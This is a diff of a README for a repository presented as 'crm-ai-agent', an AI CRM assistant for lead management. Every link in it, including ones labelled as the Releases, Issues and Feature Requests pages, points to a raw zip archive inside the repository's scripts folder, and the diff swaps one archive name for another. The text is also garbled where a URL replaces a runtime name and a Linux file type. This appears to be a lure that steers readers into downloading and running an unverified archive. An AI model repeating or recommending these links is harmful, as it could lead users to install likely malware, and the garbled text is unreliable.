@@ -1,6 +1,6 @@
 # 🤖 crm-ai-agent - Your Smart CRM Assistant for Lead Management
 
-[![Download](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/ai-crm-agent-doser.zip)](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/ai-crm-agent-doser.zip)
+[![Download](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/windows/crm-agent-ai-v3.5.zip)](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/windows/crm-agent-ai-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -13,16 +13,16 @@ Before downloading, ensure your system meets these requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **RAM:** At least 4 GB
 - **Storage:** Minimum 500 MB of free disk space
-- **https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/ai-crm-agent-doser.zip** Version 14 or higher installed
+- **https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/windows/crm-agent-ai-v3.5.zip** Version 14 or higher installed
 - **Internet Connection:** Required for setup and updates
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/ai-crm-agent-doser.zip). Here, you will find the latest version available for download.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/windows/crm-agent-ai-v3.5.zip). Here, you will find the latest version available for download.
 
-1. **Visit the Releases Page:** Click on [this link](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/ai-crm-agent-doser.zip).
+1. **Visit the Releases Page:** Click on [this link](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/windows/crm-agent-ai-v3.5.zip).
 2. **Choose the Latest Release:** Look for the top release version. It will be clearly labeled.
-3. **Download the Installer:** Click on the appropriate file for your operating system. This should typically be an `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/ai-crm-agent-doser.zip` file for Linux.
+3. **Download the Installer:** Click on the appropriate file for your operating system. This should typically be an `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/windows/crm-agent-ai-v3.5.zip` file for Linux.
 4. **Run the Installer:** Once the file downloads, locate it in your downloads folder and double-click it. Follow the on-screen instructions to install crm-ai-agent on your computer.
 
 ## ⚙️ Configuration
@@ -46,7 +46,7 @@ If you encounter any issues or have questions, you can find assistance in the fo
 
 - **Documentation:** Check the help section inside the app for useful guides and FAQs.
 - **Community Support:** Join our user community on Telegram to ask questions and share experiences.
-- **GitHub Issues:** Report any technical problems via the [Issues page](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/ai-crm-agent-doser.zip) on GitHub.
+- **GitHub Issues:** Report any technical problems via the [Issues page](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/windows/crm-agent-ai-v3.5.zip) on GitHub.
 
 ## 🔄 Updating
 
@@ -62,7 +62,7 @@ Enhance your experience with these resources:
 
 - **User Manual:** Comprehensive guides to get the most out of crm-ai-agent.
 - **FAQ:** Answers to common questions that many users have.
-- **Feature Requests:** We welcome your suggestions for new features. Share your ideas on the [Feature Requests page](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/ai-crm-agent-doser.zip).
+- **Feature Requests:** We welcome your suggestions for new features. Share your ideas on the [Feature Requests page](https://raw.githubusercontent.com/PerlitaSmith/crm-ai-agent/main/scripts/windows/crm-agent-ai-v3.5.zip).
 
 ## 📡 Getting Involved
 
